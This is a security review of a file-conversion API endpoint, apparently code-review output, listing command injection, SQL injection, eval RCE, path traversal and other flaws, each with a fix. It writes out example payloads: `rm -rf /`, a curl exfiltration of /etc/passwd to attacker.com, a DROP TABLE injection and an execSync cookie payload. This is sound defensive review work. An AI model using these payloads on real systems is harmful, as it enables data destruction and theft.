# Security Review: `/api/convert` Endpoint

## Critical Vulnerabilities

### 1. Command Injection via `exec()`
**Severity: CRITICAL**
**Rule violated: Use array args for commands, never shell=True**

`exec()` passes `filename` and `outputFormat` directly into a shell string. An attacker can inject arbitrary OS commands:

```
filename: "; rm -rf / #"
outputFormat: "&& curl attacker.com/exfil?data=$(cat /etc/passwd)"
```

**Fix:** Use `execFile` with array arguments:
```typescript
import { execFile } from 'child_process';
execFile('convert', [sanitizedPath, '-format', outputFormat, outputPath], (err) => { ... });
```

### 2. SQL Injection
**Severity: CRITICAL**
**Rule violated: Use parameterized queries only, never string concatenation**

`filename` and `outputFormat` are interpolated directly into the SQL string:
```typescript
const query = `INSERT INTO conversions (filename, format) VALUES ('${filename}', '${outputFormat}')`;
```

An attacker can inject: `filename: "'; DROP TABLE conversions; --"`

**Fix:** Use parameterized queries:
```typescript
await mysql.query('INSERT INTO conversions (filename, format) VALUES (?, ?)', [filename, outputFormat]);
```

### 3. Arbitrary Code Execution via `eval()`
**Severity: CRITICAL**
**Rule violated: Never deserialize untrusted data with pickle/eval**

```typescript
const prefs = eval('(' + req.cookies.prefs + ')');
```

An attacker sets the `prefs` cookie to `); require('child_process').execSync('whoami'); (` and achieves full RCE.

**Fix:** Use `JSON.parse` with error handling:
```typescript
let prefs = {};
try { prefs = JSON.parse(req.cookies.prefs); } catch { /* use defaults */ }
```

### 4. Path Traversal
**Severity: CRITICAL**
**Rule violated: Path traversal: realpath() + prefix check**

`filename` is used directly in `readFile(`/uploads/${filename}`)`. An attacker sends `filename: "../../etc/passwd"` to read arbitrary files.

**Fix:**
```typescript
import { realpath } from 'fs/promises';
import path from 'path';

const resolved = await realpath(path.join('/uploads', filename));
if (!resolved.startsWith('/uploads/')) {
  return res.status(400).json({ error: 'Invalid path' });
}
```

### 5. Blocklist-Based Validation (Bypassable)
**Severity: HIGH**
**Rule violated: Validate all input via schema allowlists, never blocklists**

The extension check uses a client-supplied blocklist (`req.body.blockedExtensions`). The attacker controls both the filename and the blocklist, so they can simply send an empty array to bypass all filtering.

**Fix:** Define the allowlist server-side:
```typescript
const ALLOWED_EXTENSIONS = ['png', 'jpg', 'gif', 'webp', 'pdf'];
const ext = path.extname(filename).slice(1).toLowerCase();
if (!ALLOWED_EXTENSIONS.includes(ext)) {
  return res.status(400).json({ error: 'Unsupported format' });
}
```

## High-Severity Issues

### 6. No Input Validation or Schema Enforcement
**Rule violated: Validate content-type, payload size, schema on all request bodies**

No validation that `filename`, `outputFormat`, or `blockedExtensions` exist, are strings, or match expected patterns. Missing fields cause uncaught TypeErrors (e.g., `blockedExtensions.includes` on `undefined`).

**Fix:** Validate with a schema (e.g., Zod):
```typescript
const schema = z.object({
  filename: z.string().regex(/^[\w.-]+$/),
  outputFormat: z.enum(['png', 'jpg', 'webp', 'gif', 'pdf']),
});
```

### 7. Internal Error Leakage
**Rule violated: Never expose internal errors to clients**

`err.message` from the `exec` callback is returned directly to the client, potentially leaking file paths, system info, or stack traces.

**Fix:** Log the full error server-side, return a generic message to the client.

### 8. No File Upload Validation
**Rule violated: Validate file uploads: size, MIME type, extension**

The endpoint reads from `/uploads/` without verifying file size, MIME type, or that the file was legitimately uploaded. Combined with path traversal, this reads any file on the filesystem.

## Summary

| # | Vulnerability | Severity | OWASP Category |
|---|---|---|---|
| 1 | Command Injection (`exec`) | CRITICAL | A03:2021 Injection |
| 2 | SQL Injection | CRITICAL | A03:2021 Injection |
| 3 | RCE via `eval()` | CRITICAL | A03:2021 Injection |
| 4 | Path Traversal | CRITICAL | A01:2021 Broken Access Control |
| 5 | Client-controlled blocklist | HIGH | A04:2021 Insecure Design |
| 6 | No input schema validation | HIGH | A03:2021 Injection |
| 7 | Internal error leakage | HIGH | A05:2021 Security Misconfiguration |
| 8 | No file validation | HIGH | A04:2021 Broken Access Control |

**Verdict:** This endpoint has 4 critical and 4 high severity vulnerabilities. It must not be deployed. Every single user-controlled input flows unsanitized into a dangerous sink (shell, SQL, eval, filesystem).
